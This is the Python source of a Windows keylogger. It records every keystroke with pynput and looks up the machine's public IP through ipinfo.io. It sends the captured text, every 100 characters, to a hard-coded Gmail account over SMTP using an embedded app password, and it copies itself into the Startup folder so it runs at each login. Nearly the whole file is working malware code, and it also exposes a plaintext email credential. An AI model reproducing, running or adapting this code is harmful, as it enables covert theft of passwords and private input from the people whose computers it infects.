try:
  import shutil
  import os 
  from pynput.keyboard import Key, Listener
  import smtplib, ssl
  import socket
  from email.message import EmailMessage
  import threading
  import requests
  import json



except ModuleNotFoundError:
    modules = ["socket", "smtplib", "ssl", "schedule", "pynput"]
    from subprocess import call
    for module in modules: 
        call("python -m pip install " + module)
        print(f"{module} installed.....")

"""
   this is a function that will upload this keylogger.py file into the startup file to make this a really 
   functional keylogger but right now it is just very basic and only works in windows PC
"""
def move_file_to_startapp():
    main_destination = ['Hp', 'hp', 'user', 'lenovo', 'dell']
    current_dir = os.getcwd()
    path_of_python_file = os.path.join(current_dir, "keylogger.py")
    path = ""
    for destination in main_destination:
        if destination in current_dir:
            path = destination
    shutil.copy2(path_of_python_file, rf"C:\\Users\\{path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    print("line 19: new_directory =",current_dir)


substitute = open(r"C:\\Users\\Hp\\Desktop\\no.txt", "w")


"""
   This function allows us to get the public ip address of this computer from ipinfo website
   NB:- this only works when wifi is on
  
"""
def get():
        public_ip_address = None
        try:
            endpoint = 'https://ipinfo.io/json'
            response = requests.get(endpoint, verify = True)

            if response.status_code != 200:
                print('Status:', response.status_code, 'Problem with the request. Exiting.')
                exit()

            data = response.json()

            public_ip_address = data['ip']

           
        except:
            print("i think there is an error nati......")

        return public_ip_address

       
#this function is used to send email with the public ip address as the Subject of the email
def sendmail(user_message, timeout=1):
    global substitute
    
    host = socket.gethostname()
    ip = socket.gethostbyname(host)
    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    sender_email = "trialnatiemail@gmail.com"
    email_password = "updl ryrd geon tdfx"
    server.login(sender_email, email_password)
    msg = EmailMessage()
    msg['Subject'] = get()
    msg['From'] = sender_email
    msg['To'] = sender_email
    msg.set_content(user_message)
    server.send_message(msg)
    print("Email was sent succesfully....")
   

get()
word = " "

#on_press function allows us to record the keystrokes and print this functions on the terminal
def on_press(key):
    global word
    global substitute
    if (key == Key.space) or key == Key.enter:
        word += ' '
    elif key == Key.backspace:
        word = word[:-1]
    elif key == Key.shift:
        word += ''
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char
    print(f"{key} pressed")
    if len(word) % 100 == 0:
        thread1 = threading.Thread(target=sendmail, args=[word])
        thread1.start()

#Here we are recording all of the keystrokes 
with Listener(on_press=on_press) as listener:
 listener.join()